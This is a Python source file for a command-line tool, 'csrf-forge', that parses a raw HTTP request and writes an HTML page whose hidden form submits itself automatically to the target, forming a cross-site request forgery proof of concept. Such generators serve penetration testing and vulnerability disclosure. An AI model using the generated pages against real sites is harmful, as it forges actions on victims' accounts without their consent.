import argparse
import sys
from pathlib import Path
from urllib.parse import parse_qsl

from . import __version__


def parse_request(raw_request: str, scheme: str = "https") -> dict:
    lines = raw_request.splitlines()
    if not lines:
        raise ValueError("request is empty")

    request_line = lines[0]
    parts = request_line.split()
    if len(parts) != 3:
        raise ValueError(f"malformed request line: {request_line!r}")
    method, path, version = parts

    try:
        blank_line_index = lines.index("")
    except ValueError:
        blank_line_index = len(lines)

    header_lines = lines[1:blank_line_index]
    body_lines = lines[blank_line_index + 1:]

    headers = {}
    for line in header_lines:
        name, sep, value = line.partition(":")
        if not sep:
            continue
        headers[name.lower().strip()] = value.strip()

    body = "\n".join(body_lines)
    params = parse_qsl(body, keep_blank_values=True)

    host = headers.get("host")
    if not host:
        raise ValueError("missing Host header")

    url = f"{scheme}://{host}{path}"

    return {
        "method": method,
        "path": path,
        "version": version,
        "host": host,
        "content_type": headers.get("content-type"),
        "body": body,
        "params": params,
        "url": url,
    }


def build_html(parsed: dict) -> str:
    inputs = ""
    for name, value in parsed["params"]:
        safe_name = name.replace('"', "&quot;")
        safe_value = value.replace('"', "&quot;")
        inputs += f'        <input type="hidden" name="{safe_name}" value="{safe_value}">\n'

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC</title>
</head>
<body>
    <form action="{parsed['url']}" method="{parsed['method']}">
{inputs}        <input type="submit" value="Submit">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
"""


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="csrf-forge",
        description="Convert a raw HTTP request into an HTML CSRF Proof-of-Concept.",
    )
    parser.add_argument(
        "-i", "--input",
        required=True,
        metavar="REQUEST",
        help="path to a raw HTTP request file",
    )
    parser.add_argument(
        "output",
        nargs="?",
        default=None,
        help="output HTML file (default: poc.html, or use -o)",
    )
    parser.add_argument(
        "-o", "--output-file",
        dest="output_flag",
        default=None,
        help="output HTML file (alternative to positional)",
    )
    parser.add_argument(
        "--scheme",
        default="https",
        choices=["http", "https"],
        help="URL scheme for the target (default: https)",
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="suppress non-error output",
    )
    parser.add_argument(
        "-V", "--version",
        action="version",
        version=f"%(prog)s {__version__}",
    )
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)

    if args.output and args.output_flag and args.output != args.output_flag:
        print("error: output specified twice (positional and -o)", file=sys.stderr)
        return 2

    output = args.output or args.output_flag or "poc.html"

    input_path = Path(args.input)
    output_path = Path(output)

    if not input_path.is_file():
        print(f"error: input file not found: {input_path}", file=sys.stderr)
        return 1

    raw_request = input_path.read_text(encoding="utf-8")

    try:
        parsed = parse_request(raw_request, scheme=args.scheme)
    except (ValueError, IndexError) as exc:
        print(f"error: failed to parse request: {exc}", file=sys.stderr)
        return 1

    html = build_html(parsed)
    output_path.write_text(html, encoding="utf-8")

    if not args.quiet:
        print("CSRF PoC generated successfully.")
        print(f"Input:  {input_path}")
        print(f"Output: {output_path}")
        print()
        print("Parsed request:")
        print(f"  method:       {parsed['method']}")
        print(f"  path:         {parsed['path']}")
        print(f"  host:         {parsed['host']}")
        print(f"  content-type: {parsed['content_type']}")
        print(f"  url:          {parsed['url']}")
        print(f"  params:       {parsed['params']}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
